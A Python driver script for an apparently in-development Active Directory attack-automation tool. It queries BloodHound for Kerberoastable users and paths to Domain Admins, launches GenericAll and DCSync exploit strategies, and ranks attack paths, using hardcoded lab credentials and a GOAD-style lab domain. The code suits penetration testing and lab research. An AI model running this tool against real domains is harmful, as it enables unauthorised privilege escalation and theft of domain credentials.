# main.py
import os
import sys
from dotenv import load_dotenv

from entities.client import Client
from entities.node import Node
from entities.node_kind import NodeKind

from utils.request import BHRequest
from utils.platform import BACKEND

from services.pathfinding import get_path
from services.printing import (
    print_check, print_done,
    print_error, print_warning, 
    print_title, print_node, 
    print_dict_node, print_level,
    print_path
)
from services.reporting import *
from services.parse_objects import *
from services.enumeration import Enumerations

from exceptions.no_path_error import NoPathError
from exceptions.auto_pwn_exception import AutoPwnException
from exceptions.config_error import ConfigError
from exceptions.hop_failed_error import HopFailedError

from strategies.generic_all import GenericAllStrategy
from strategies.dc_sync import DCSyncStrategy

from services.scoring import path_cost
from references.privilege_levels import classify, PrivilegeLevel

load_dotenv()

def _run_strategy(strategy, edge, creds: dict) -> None:
    """Lance une stratégie et affiche le résultat de façon uniforme."""
    print_check(f"Attacker : {edge.start.label}  ({edge.start.kind.value})")
    print_check(f"Target   : {edge.target.label}  ({edge.target.kind.value})")
    print_check(f"can_exploit() → {strategy.can_exploit()}")
    print_check(f"Launching exploit — {edge.kind.value}")

    try:
        result = strategy.exploit(creds)
        if result.was_executed():
            print_done(f"Exploit succeeded! Technique: {result.technique}")
            print_check(f"Output:\n{result.summary()}")
            result.print_next_steps()
        elif result.is_dry_run():
            print_warning(f"Dry run / success=None:\n{result.output}")
        else:
            print_warning(f"Exploit failed:\n{result.output}")
    except HopFailedError as e:
        print_error(f"HopFailedError: {e}")

# Credentials communs pour toutes les stratégies (lus depuis .env)
CREDS = {
    "dc_ip":    os.getenv("DC_IP",       "192.168.56.10"),
    "domain":   os.getenv("AD_DOMAIN",   "sevenkingdoms.local"),
    "username": os.getenv("AD_USERNAME", "cersei"),
    "password": os.getenv("AD_PASSWORD", "cersei"),
}

# ─── 1. Load credentials ────────────────────────────────────────────────────

TOKEN_ID = os.getenv("BLOODHOUND_TOKEN_ID")
TOKEN_KEY = os.getenv("BLOODHOUND_TOKEN_KEY")
BH_URL = os.getenv("BLOODHOUND_URL", "http://127.0.0.1:8080")

try:
    client = Client(TOKEN_ID, TOKEN_KEY, BH_URL)
    bh = BHRequest(client)

    print_check(f"Credentials loaded — connecting to {BH_URL}")

except ConfigError as e:
    print_error(f"{e}")
    sys.exit(1)
except Exception as e:
    print_error(f"Unexpected error while initializing client: {e}")
    sys.exit(1)

# ─── 2. Connectivity check ───────────────────────────────────────────────────

print_title("Step 1 — Checking API connectivity")
result = bh.bh_get("/api/v2/self")
if result is None:
    print_error("Could not reach BloodHound. Check BH_URL and that the server is running.")
    sys.exit(1)
print_check(f"Connected. Token belongs to: {result.get('data', {}).get('principal_name', '?')}")

# ─── 3. Raw Cypher query — list domains ──────────────────────────────────────
# Sanity check that the Neo4j data is populated and the Cypher endpoint works.

print_title("Step 2 — Querying domains in Neo4j")
enum = Enumerations(bh_request=bh)
print_check("List of All Domains : ")
domains = enum.get_domains()
print_check(f"Found {len(domains.keys())} domain(s):")
if domains is None:
	print_error("Cypher query failed. Is data collected and ingested?")
	sys.exit(1)
print_dict_node(domains)

print_check("List of All Users")
users = enum.get_users()
print_dict_node(users)

print_check("List of All Groups")
groups = enum.get_groups()
print_dict_node(groups)

# ─── 4. Find a Kerberoastable user ───────────────────────────────────────────

print_title("\nStep 3 — Finding Kerberoastable users")
kerb_result = bh.bh_post("/api/v2/graphs/cypher", {
    "query": "MATCH (u:User) WHERE u.hasspn = true AND u.enabled = true RETURN u",
    "include_properties": True
})
kerb_nodes = kerb_result.get("data", {}).get("nodes", {}) if kerb_result else {}
if not kerb_nodes:
	print_warning("No Kerberoastable users found (or query failed).")
else:
	print_check(f"Found {len(kerb_nodes)} Kerberoastable user(s):")
	for node in kerb_nodes.values():
		spns = node["properties"].get("serviceprincipalnames", [])
		print(f"    • {node['label']}  SPNs: {spns}") # TODO : format

# ─── 5. Find Domain Admins group objectId ────────────────────────────────────

print_title("\nStep 4 — Locating Domain Admins group")
da_result = bh.bh_post("/api/v2/graphs/cypher", {
    "query": "MATCH (g:Group) WHERE g.name STARTS WITH 'DOMAIN ADMINS' RETURN g",
    "include_properties": True
})
da_nodes = da_result.get("data", {}).get("nodes", {}) if da_result else {}
if not da_nodes:
	print_error("Domain Admins group not found.")
	sys.exit(1)

da_data    = list(da_nodes.values())[0]
da_node    = Node(da_data["objectId"], NodeKind.GROUP, da_data["label"], da_data["properties"])
print_node(da_node)

# ─── 6. Find a user to path from ─────────────────────────────────────────────

print_title("Step 5 — Finding a user to path from")
user_result = bh.bh_post("/api/v2/graphs/cypher", {
    "query": "MATCH (u:User) WHERE u.enabled = true RETURN u LIMIT 5",
    "include_properties": True
})
user_nodes = user_result.get("data", {}).get("nodes", {}) if user_result else {}
if not user_nodes:
    print_error("No enabled users found.")
    sys.exit(1)

print_check(f"Found {len(user_nodes)} enabled user(s):")
for u_data in user_nodes.values():
    print_node(parse_node(u_data))

# ─── 7. Shortest path to Domain Admins ───────────────────────────────────────

print_title("Step 6 — Shortest path to Domain Admins")
path_found = False
for u_data in user_nodes.values():
    source = parse_node(u_data)
    if source is None:
        continue
    print_check(f"Trying: {source.label} → {da_node.label}")
    try:
        path = get_path(bh, source, da_node)
        # Filter out None edges from unknown EdgeKinds before rendering
        path.edges = [e for e in path.edges if e is not None]
        if not path.edges:
            print_warning(f"Path found but all edges were unknown kinds, skipping.")
            continue
        print_check(f"Path found! Length: {path.length} hop(s)")
        print_path(path, index=1)
        path_found = True
        break
    except NoPathError:
        print_warning(f"No path from {source.label}, trying next...")
    except AutoPwnException as e:
        print_error(f"Tool error: {e}")
        break

if not path_found:
    print_warning("No path found from any of the sampled users.")

print_done("All checks complete.")

# ─── 8. Find & exploit a GenericAll edge ───────────────────────────────────
print_title("Step 7 — Testing GenericAll exploit")

# ── 8a. Détecter le backend ───────────────────────────────────────────────────

print_check(f"Backend detected: {BACKEND.name}")
if BACKEND.name == "none":
    print_error("No backend available. Install bloodyAD (Linux) or bloodyAD in WSL (Windows).")
    print_warning("Skipping exploit test.")
else:
    # ── 8b. Chercher un edge GenericAll dans Neo4j ──────────────────────────

    ga_result = bh.bh_post("/api/v2/graphs/cypher", { # GenericWrite
        "query": """
            MATCH (src)-[r:GenericAll]->(dst)
            WHERE src.enabled = true
            RETURN src, r, dst
            LIMIT 1
        """,
        "include_properties": True
    })

    ga_nodes = ga_result.get("data", {}).get("nodes", {}) if ga_result else {}
    # node : label, kind, kinds, objectId, isTierZero, isOwnedObject
    # print(ga_nodes)
    ga_edges = ga_result.get("data", {}).get("edges", []) if ga_result else []

    if not ga_edges:
        print_warning("No GenericAll edge found in the graph.") # /GenericWrite
    elif not ga_nodes:
        print_warning("No GenericAll nodes found in the graph.") # /GenericWrite
    else:
        nodes = parse_dict_node(n=ga_nodes)
        edge = parse_list_edge(e=ga_edges, nodes=nodes)[0]

        src_node = edge.start
        dst_node = edge.target
        print_check(f"Found edge: {edge.kind.value} — {src_node} → {dst_node}")
        print_check(f"Attacker : {src_node.label}  ({src_node.kind.value})")
        print_check(f"Target   : {dst_node.label}  ({dst_node.kind.value})")

        strategy = GenericAllStrategy(edge=edge)
        print_check(f"can_exploit() → {strategy.can_exploit()}")

        creds = {
            "dc_ip":    os.getenv("DC_IP",       "192.168.56.10"),
            "domain":   os.getenv("AD_DOMAIN",   "sevenkingdoms.local"),
            "username": os.getenv("AD_USERNAME", "cersei"),
            "password": os.getenv("AD_PASSWORD", "cersei"),
            # "hashes": os.getenv("AD_HASHES"),  # LM:NT si PTH
        }

        print_check(f"Launching exploit — {edge.kind.value}")

        result = strategy.exploit(creds)
        try:
            if result.was_executed():
                print_done(f"Exploit succeeded! Technique: {result.technique}")
                print_check(f"Output:\n{result.summary()}")
                result.print_next_steps()
            elif result.is_dry_run():
                print_warning(f"Exploit returned success=None:\n{result.output}")
            else:
                print_warning(f"Exploit returned success=False:\n{result.output}")
        except HopFailedError as e:
            print_error(f"HopFailedError: {e}")

# ─── 9. DCSync ──────────────────────────────────────────────────────────────
print_title("Step 8 — Testing DCSync exploit")

dc_result = bh.bh_post("/api/v2/graphs/cypher", {
    "query": """
        MATCH (src)-[r:DCSync|GetChangesAll]->(dst:Domain)
        WHERE src.enabled = true
        RETURN src, r, dst
        LIMIT 1
    """,
    "include_properties": True
})

dc_nodes = dc_result.get("data", {}).get("nodes", {}) if dc_result else {}
dc_edges = dc_result.get("data", {}).get("edges", []) if dc_result else []

if not dc_edges or not dc_nodes:
    print_warning("No DCSync / GetChangesAll edge found in the graph.")
else:
    nodes  = parse_dict_node(n=dc_nodes)
    edge   = parse_list_edge(e=dc_edges, nodes=nodes)[0]

    strategy = DCSyncStrategy(edge=edge)
    print_check(f"Found edge: {edge.kind.value} — {edge.start.label} → {edge.target.label}")
    print_check(f"can_exploit() → {strategy.can_exploit()}")

    _run_strategy(strategy, edge, CREDS)

# ─── 10. High-value targets ───────────────────────────────────────────────────
# We need : a reference table or lookup catalog
print_title("Step 9 — High-value targets")

tz_result = bh.bh_post("/api/v2/graphs/cypher", { # Tier Zero, enabled?
        "query": """
            MATCH (zrt:Base)
            WHERE (zrt:Tag_Tier_Zero)
            RETURN zrt
        """,
        "include_properties": True
    })

tz_nodes = tz_result.get("data", {}).get("nodes", {}) if tz_result else {}

if not tz_nodes:
    print_warning("No High-value targets found.") # /GenericWrite
else:
    nodes = parse_dict_node(n=tz_nodes)
    print_dict_node(nodes)

    # Define owned nodes (hardcoded for now — Vagrant)
    # For each owned node, for each Tier Zero target, find path
    # Score each path
    # Show the best ones

    # ──────────────────────────────────────────────────────────
    # Step 11 — Define owned nodes (hardcoded for v1)
    # ──────────────────────────────────────────────────────────

    print_title("Step 10 — Owned nodes")

    # For now: we know vagrant's SID from the output
    # In v2 this will come from the API or user input
    owned_nodes: list[Node] = [
        Node(
            objectid="S-1-5-21-4100227132-2050190331-2295276406-1000",
            kind=NodeKind.USER,
            label="VAGRANT@SEVENKINGDOMS.LOCAL",
            properties={"owned": True}
        )
    ]

    for node in owned_nodes:
        print_node(node,"Owned") #success


    # ──────────────────────────────────────────────────────────
    # Step 12 — Classify targets by privilege level
    # ──────────────────────────────────────────────────────────

    print_title("Step 11 — Classify targets")

    # Group targets by privilege level and sort (most critical first)
    classified: dict[PrivilegeLevel, list[Node]] = {}
    for node in nodes.values():
        level = classify(node)
        if level not in classified.keys():
            classified[level] = [node]
        else:
            classified[level].append(node)

    for level, nodes in classified.items():
        print_level(level)
        for node in nodes:
            print_node(node)

    # ──────────────────────────────────────────────────────────
    # Step 13 — Find paths from owned → targets
    # ──────────────────────────────────────────────────────────

    print_title("Step 12 — Attack paths")

    results = []

    for level, targets in classified.items():  # ?? We'll print all paths, but later only the best (!!)
        for source in owned_nodes:
            for target in targets:
                # Skip if source IS the target
                if source.objectid == target.objectid:
                    continue
                try:
                    path = get_path(bh, source, target)
                    cost = path_cost(path.edges)
                    results.append({
                        "source": source,
                        "target": target,
                        "privilege_level": level,
                        "path": path,
                        "cost": cost,
                    })
                    print_check(
                        f"{source.label} → {target.label} "
                        f"[{level.name}] cost={cost} hops={len(path.edges)}"
                    )
                except NoPathError:
                    print_warning(f"No path: {source.label} → {target.label}")
                except Exception as e:
                    print_warning(f"Error: {source.label} → {target.label}: {e}")

    # ──────────────────────────────────────────────────────────
    # Step 14 — Rank and display best attack paths
    # ──────────────────────────────────────────────────────────

    print_title("Step 13 — Best attack paths")

    if not results:
        print_warning("No attack paths found from owned nodes.")
    else:
        # Sort: most critical target first, then cheapest path
        results.sort(key=lambda r: (r["privilege_level"], r["cost"]))

        for i, r in enumerate(results, 1):
            panel = format_path(
                path=r["path"],
                index=i,
                privilege_level=r["privilege_level"],
            )
            console.print(panel)